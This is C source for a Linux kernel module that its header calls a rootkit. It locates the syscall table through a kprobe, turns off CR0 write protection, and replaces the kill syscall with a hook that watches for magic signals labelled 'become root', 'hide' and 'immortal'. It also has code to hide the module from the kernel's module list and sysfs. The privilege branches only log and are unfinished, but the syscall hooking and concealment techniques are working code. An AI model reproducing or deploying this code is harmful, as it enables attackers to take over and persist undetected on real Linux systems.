/*
 * pwn: A linux kernel module rootkit
 *
 * Copyright (c) 2025 Joshua Poole <joshpoole6@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/kprobes.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <asm/paravirt.h>
#include <linux/slab.h>

// Module info
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Joshua Poole");
MODULE_DESCRIPTION("LKM rootkit");
MODULE_VERSION("0.1");

// We need to use kprobes to get the lookup_name function from the kernel, as it is no longer enabled to export by
// default from versions > 5.7.0
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
    static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };

    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    static kallsyms_lookup_name_t kallsyms_lookup_name_fn;

#endif
unsigned long *sys_call_table;

static unsigned long *get_syscall_table(void) {
    unsigned long *syscall_table;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
    kallsyms_lookup_name_fn = (kallsyms_lookup_name_t)kp.addr;
    syscall_table = (unsigned long *)kallsyms_lookup_name_fn("sys_call_table");
#else
    #include <linux/kallsyms.h>
    syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
#endif

    return syscall_table;
}

/* NOTE: THE FOLLOWING THREE FUNCTIONS ARE TAKEN FROM THIS SOURCE:
https://jm33.me/we-can-no-longer-easily-disable-cr0-wp-write-protection.html */
// These functions are used to modify the cr0 register in the CPU, whos 16th bit is the write protection (WP) bit
// This allows processes to write into read-only pages, including the syscall table!!
static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    /* __asm__ __volatile__( */
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void)
{
    preempt_enable();
    write_cr0_forced(read_cr0() | 0x10000);
    printk(KERN_INFO "protected memory\n");
}

static inline void unprotect_memory(void)
{
    preempt_disable();
    write_cr0_forced(read_cr0() & ~0x10000);
    printk(KERN_INFO "unprotected memory\n");
}
/* NOTE: THE PREVIOUS THREE FUNCTIONS ARE TAKEN FROM THIS SOURCE:
https://jm33.me/we-can-no-longer-easily-disable-cr0-wp-write-protection.html*/

#if defined __x86_64__
/* On x86_64 architecture, from linux version 4.17 onwards, system call functions are not called within the kernel,
rather, are called using struct pt_regs, which is a syscall wrapper*/
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
        // If we are in here, we need to use pt_regs to hook into syscalls
        #define USING_PT_REGS 1
        // Function pointer to a syscall function
        typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
        // syscalls
        static ptregs_t orig_kill;
    #else
        typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
        static orig_kill_t orig_kill;
    #endif

    // used for hooking into syscalls
    #define ASM_HOOK_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
    #define ASM_HOOK_CODE_OFFSET 2
#endif

static inline void disable_wp(void)
{
    unsigned long cr0 = read_cr0();
    preempt_disable();
    local_irq_disable();

    write_cr0_forced(cr0 & ~X86_CR0_WP);
}

static inline void enable_wp(void)
{
    unsigned long cr0 = read_cr0();
    write_cr0_forced(cr0 | X86_CR0_WP);
    local_irq_enable();
    preempt_enable();
}


struct asm_hook {
    void *original_function;
    void *modified_function;
    char original_asm[sizeof(ASM_HOOK_CODE)-1];
    struct list_head list;
};

LIST_HEAD(asm_hook_list);

void _asm_hook_patch(struct asm_hook *h)
{
    disable_wp();
    memcpy(h->original_function, ASM_HOOK_CODE, sizeof(ASM_HOOK_CODE)-1);
    *(void **)&((char *)h->original_function)[ASM_HOOK_CODE_OFFSET] = h->modified_function;
    enable_wp();
}

int asm_hook_create(void *original_function, void *modified_function)
{
    struct asm_hook *h = kmalloc(sizeof(struct asm_hook), GFP_KERNEL);

    if (!h) {
        return 0;
    }

    h->original_function = original_function;
    h->modified_function = modified_function;
    memcpy(h->original_asm, original_function, sizeof(ASM_HOOK_CODE)-1);
    list_add(&h->list, &asm_hook_list);

    _asm_hook_patch(h);

    return 1;
}

void asm_hook_patch(void *modified_function)
{
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list) {
        if (h->modified_function == modified_function) {
            _asm_hook_patch(h);
            break;
        }
    }
}

void _asm_hook_unpatch(struct asm_hook *h)
{
    disable_wp();
    memcpy(h->original_function, h->original_asm, sizeof(ASM_HOOK_CODE)-1);
    enable_wp();
}

void *asm_hook_unpatch(void *modified_function)
{
    void *original_function = NULL;
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list) {
        if (h->modified_function == modified_function) {
            _asm_hook_unpatch(h);
            original_function = h->original_function;
            break;
        }
    }

    return original_function;
}

void asm_hook_remove_all(void)
{
    struct asm_hook *h, *tmp;

    list_for_each_entry_safe(h, tmp, &asm_hook_list, list) {
        _asm_hook_unpatch(h);
        list_del(&h->list);
        kfree(h);
    }
}

static int store_original_syscalls(void) {
#if USING_PT_REGS
    printk(KERN_INFO "We are using pt_regs\n");
    orig_kill = (ptregs_t)sys_call_table[__NR_kill];
    printk(KERN_INFO "orig_kill table entry successfully stored\n");
#else
    orig_kill = (orig_kill_t)sys_call_table[__NR_kill];
    printk(KERN_INFO "orig_kill table entry successfully stored\n");
#endif

    return 0;
}

#define SIGSUPER 64     // make a process root
#define SIGINVIS 63     // make a process invisible
#define SIGIMORT 62     // make a process immortal (cannot be killed)

#if USING_PT_REGS

static asmlinkage long hook_kill(const struct pt_regs *regs) {
    // int pid = regs->di;
    printk(KERN_INFO "********hooked kill syscall**********\n");
    int sig = regs->si;
    if (sig == SIGSUPER) {
        printk(KERN_INFO "signal: %d == SIGSUPER: %d | become root", sig, SIGSUPER);
        return 0;
    } else if (sig == SIGINVIS) {
        printk(KERN_INFO "signal: %d == SIGSUPER: %d | hide a file", sig, SIGINVIS);
        return 0;
    } else if (sig == SIGIMORT) {
        printk(KERN_INFO "signal: %d == SIGSUPER: %d | become immortal", sig, SIGIMORT);
        return 0;
    }

    return orig_kill(regs);
}

#else

static asmlinkage long hook_kill(pid_t pid, int sig) {
    printk(KERN_INFO "********hacked kill syscall**********\n");
    if (sig == SIGSUPER) {
        printk(KERN_INFO "signal: %d == SIGSUPER: %d | become root", sig, SIGSUPER);
        return 0;
    } else if (sig == SIGINVIS) {
        printk(KERN_INFO "signal: %d == SIGSUPER: %d | hide a file", sig, SIGINVIS);
        return 0;
    } else if (sig == SIGIMORT) {
        printk(KERN_INFO "signal: %d == SIGSUPER: %d | become immortal", sig, SIGIMORT);
        return 0;
    }
    return orig_kill(pid, sig);
}

#endif

static int hook_syscall_table(void) {
    printk(KERN_INFO "Adding syscalls hooks into syscall_table\n");
    disable_wp();
    orig_kill = (void *)sys_call_table[__NR_kill];
    printk(KERN_INFO "Old kill syscall: %px\n", sys_call_table[__NR_kill]);
    sys_call_table[__NR_kill] = (unsigned long)hook_kill;
    printk(KERN_INFO "New kill syscall: %px\n", sys_call_table[__NR_kill]);
    enable_wp();
    return 0;
}

// ******************** Hide module from the kernel ********************
struct list_head *module_list;
struct kobject *module_kobj;
int is_hidden = 0;

static void hide_module(void) {
    if (is_hidden) return;

    printk(KERN_INFO "Hiding module");
    module_list = THIS_MODULE->list.prev;
    module_kobj = &THIS_MODULE->mkobj.kobj;

    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    is_hidden = 1;
}

static void unhide_module(void) {
    if (!is_hidden) return;

    printk(KERN_INFO "Unhiding module");
    list_add(&THIS_MODULE->list, module_list);
    kobject_add(&THIS_MODULE->mkobj.kobj, module_kobj, "%s", THIS_MODULE->name);
    is_hidden = 0;
}




// static int cleanup(void) {
//     // kill
//     sys_call_table[__NR_kill] = (unsigned long)orig_kill;

//     return 0;
// }

// static int __init mod_init(void) {
//     int err = 1;
//     printk(KERN_INFO "rootkit: init\n");

//     if (register_kprobe(&kp) < 0) {
//         printk(KERN_INFO "Failed to register kprobe\n");
//         return -1;
//     }

//     sys_call_table = get_syscall_table();
//     printk(KERN_INFO "Address in sys_call_table: %px\n", sys_call_table);

//     if (!sys_call_table) {
//         printk(KERN_INFO "err: sys_call_table == NULL\n");
//         return err;
//     }

//     if (store_original_syscalls() == err) {
//         printk(KERN_INFO "err: store error\n");
//     }

//     hook_syscall_table();
//     // unprotect_memory();
//     // if (hook_syscall_table() == err) {
//     //     printk(KERN_INFO "err: hook error\n");
//     // }
//     // protect_memory();

//     // hide_module();
//     return 0;
// }

static int __init mod_init(void) {
    printk(KERN_INFO "rootkit: init start\n");

    if (register_kprobe(&kp) < 0) {
        printk(KERN_ERR "Failed to register kprobe\n");
        return -1;
    }
    printk(KERN_INFO "kprobe registered\n");

    sys_call_table = get_syscall_table();
    printk(KERN_INFO "sys_call_table at %px\n", sys_call_table);

    if (!sys_call_table) {
        printk(KERN_ERR "sys_call_table is NULL\n");
        unregister_kprobe(&kp);
        return -EINVAL;
    }

    if (store_original_syscalls() < 0) {
        printk(KERN_ERR "Failed to store original syscalls\n");
        unregister_kprobe(&kp);
        return -EINVAL;
    }
    printk(KERN_INFO "Stored original syscalls\n");

    if (hook_syscall_table() < 0) {
        printk(KERN_ERR "Failed to hook syscall table\n");
        unregister_kprobe(&kp);
        return -EINVAL;
    }
    printk(KERN_INFO "Hooked syscall table\n");

    printk(KERN_INFO "rootkit: init done\n");
    return 0;
}

static void __exit mod_exit(void) {
    int err = 1;
    printk(KERN_INFO "rootkit: exit\n");
    // unprotect_memory();
    // if (cleanup() == err) {
    //     printk(KERN_INFO "err: cleanup error\n");
    // }
    // protect_memory();
    asm_hook_remove_all();
    unregister_kprobe(&kp);
}

module_init(mod_init);
module_exit(mod_exit);